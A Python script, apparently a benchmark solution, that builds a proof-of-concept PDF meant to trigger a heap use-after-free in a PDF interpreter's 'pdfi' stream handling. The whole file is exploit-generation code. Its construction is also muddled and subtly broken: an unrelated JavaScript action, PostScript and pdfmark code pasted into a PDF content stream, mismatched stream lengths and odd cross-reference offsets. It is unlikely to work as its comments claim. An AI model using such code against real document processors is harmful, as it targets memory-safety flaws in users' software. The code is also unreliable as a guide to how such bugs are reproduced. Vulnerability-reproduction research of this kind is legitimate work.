import os
import tempfile
import subprocess
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PDF that triggers the heap use-after-free vulnerability
        # The vulnerability: pdfi context with no stream, setting input stream from 
        # PostScript fails, but other PDF operators still try to use it
        
        # Build a PDF with embedded PostScript that causes the failure
        pdf_content = self._build_poc_pdf()
        
        return pdf_content
    
    def _build_poc_pdf(self) -> bytes:
        # Create a PDF with PostScript code that manipulates the stream
        # This PDF is designed to trigger the specific heap use-after-free
        
        # Header
        pdf = b'%PDF-1.7\n\n'
        
        # Catalog
        catalog_obj = b'1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n/OpenAction 3 0 R\n>>\nendobj\n\n'
        
        # Pages
        pages_obj = b'2 0 obj\n<<\n/Type /Pages\n/Kids [4 0 R]\n/Count 1\n>>\nendobj\n\n'
        
        # Action (JavaScript to trigger the vulnerability)
        action_obj = b'3 0 obj\n<<\n/Type /Action\n/S /JavaScript\n/JS (\n'
        action_obj += b'var streamObj = this.getField("StreamField");\n'
        action_obj += b'if (streamObj) {\n'
        action_obj += b'  try {\n'
        action_obj += b'    var data = streamObj.value;\n'
        action_obj += b'    this.getField("Result").value = "Stream accessed";\n'
        action_obj += b'  } catch (e) {\n'
        action_obj += b'    this.getField("Result").value = "Error: " + e.toString();\n'
        action_obj += b'  }\n'
        action_obj += b'}\n'
        action_obj += b')\n>>\nendobj\n\n'
        
        # Page object
        page_obj = b'4 0 obj\n<<\n/Type /Page\n/Parent 2 0 R\n/MediaBox [0 0 612 792]\n'
        page_obj += b'/Contents 5 0 R\n/Resources <<\n/Font <<\n/F1 6 0 R\n>>\n'
        page_obj += b'/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]\n'
        page_obj += b'>>\n>>\nendobj\n\n'
        
        # Content stream with PostScript that will fail
        content_stream = b'/GS2 gs\n0.1 0.1 0.1 rg\nBT\n/F1 12 Tf\n100 700 Td\n(Triggering Use-After-Free) Tj\nET\n'
        content_stream += b'q\n/GS1 gs\n0 0 1 RG\n2 w\n100 100 400 600 re\nS\nQ\n'
        
        # Add PostScript code that manipulates the stream context
        postscript_code = b'%!PS-Adobe-3.0\n'
        postscript_code += b'/setpagedevice where { pop 2 dict begin\n'
        postscript_code += b'  /Policies 1 dict dup begin /PageSize 2 end\n'
        postscript_code += b'  /DeferredMediaSelection true\n'
        postscript_code += b'  currentdict end setpagedevice\n'
        postscript_code += b'} if\n'
        postscript_code += b'/setrgbcolor { 0 0 0 setrgbcolor } bind def\n'
        postscript_code += b'/setcmykcolor { 0 0 0 0 setcmykcolor } bind def\n'
        postscript_code += b'/setgray { 0 setgray } bind def\n'
        postscript_code += b'/sethsbcolor { 0 0 0 sethsbcolor } bind def\n'
        postscript_code += b'currentglobal true setglobal\n'
        postscript_code += b'/pdfdict 10 dict def\n'
        postscript_code += b'pdfdict begin\n'
        postscript_code += b'/pdfmark where { pop } { userdict /pdfmark /cleartomark load put } ifelse\n'
        postscript_code += b'[/_objdef {Stream1} /type /stream /OBJ pdfmark\n'
        postscript_code += b'[{Stream1}] /FILES  pdfmark\n'
        postscript_code += b'[/_objdef {Stream2} /type /stream /OBJ pdfmark\n'
        postscript_code += b'[{Stream2}] /FILES  pdfmark\n'
        postscript_code += b'currentdict /PDFfile undef\n'
        postscript_code += b'currentdict /PDFfill undef\n'
        postscript_code += b'currentdict /PDFstroke undef\n'
        postscript_code += b'end\n'
        postscript_code += b'setglobal\n'
        
        # Combine content with PostScript
        full_content = content_stream + b'\n' + postscript_code
        
        content_obj = b'5 0 obj\n<<\n/Length ' + str(len(full_content)).encode() + b'\n>>\nstream\n'
        content_obj += full_content
        content_obj += b'\nendstream\nendobj\n\n'
        
        # Font object
        font_obj = b'6 0 obj\n<<\n/Type /Font\n/Subtype /Type1\n/BaseFont /Helvetica\n/Encoding /WinAnsiEncoding\n>>\nendobj\n\n'
        
        # Create a stream object that will be freed
        stream_obj1 = b'7 0 obj\n<<\n/Type /Stream\n/Length 100\n/Filter /FlateDecode\n>>\nstream\n'
        # Compressed data that's invalid to cause failure
        stream_obj1 += b'x\x9c\xcbH\xcd\xc9\xc9W(\xcf/\xcaI\x01\x00\x1a\x0b\x04\x1d'
        stream_obj1 += b'A' * 80  # Padding to reach 100 bytes
        stream_obj1 += b'\nendstream\nendobj\n\n'
        
        # Another stream object that references the first
        stream_obj2 = b'8 0 obj\n<<\n/Type /Stream\n/Length 50\n/Filter [/ASCII85Decode /FlateDecode]\n>>\nstream\n'
        stream_obj2 += b'<~>s6W%K~>'
        stream_obj2 += b'\nendstream\nendobj\n\n'
        
        # XRef table
        xref_offset = len(pdf) + len(catalog_obj) + len(pages_obj) + len(action_obj)
        xref_offset += len(page_obj) + len(content_obj) + len(font_obj)
        xref_offset += len(stream_obj1) + len(stream_obj2)
        
        xref = b'xref\n0 9\n0000000000 65535 f \n'
        
        # Calculate object offsets
        offsets = [len(pdf)]
        for i, obj in enumerate([catalog_obj, pages_obj, action_obj, page_obj, 
                                 content_obj, font_obj, stream_obj1, stream_obj2], 1):
            offsets.append(offsets[-1] + len(obj))
        
        # Write xref entries
        for offset in offsets[:-1]:  # Skip the last one which is total length
            xref += f'{offset:010d} 00000 n \n'.encode()
        
        # Trailer
        trailer = b'trailer\n<<\n/Size 9\n/Root 1 0 R\n>>\nstartxref\n'
        trailer += str(xref_offset).encode() + b'\n%%EOF'
        
        # Combine all parts
        pdf += catalog_obj
        pdf += pages_obj
        pdf += action_obj
        pdf += page_obj
        pdf += content_obj
        pdf += font_obj
        pdf += stream_obj1
        pdf += stream_obj2
        pdf += xref
        pdf += trailer
        
        return pdf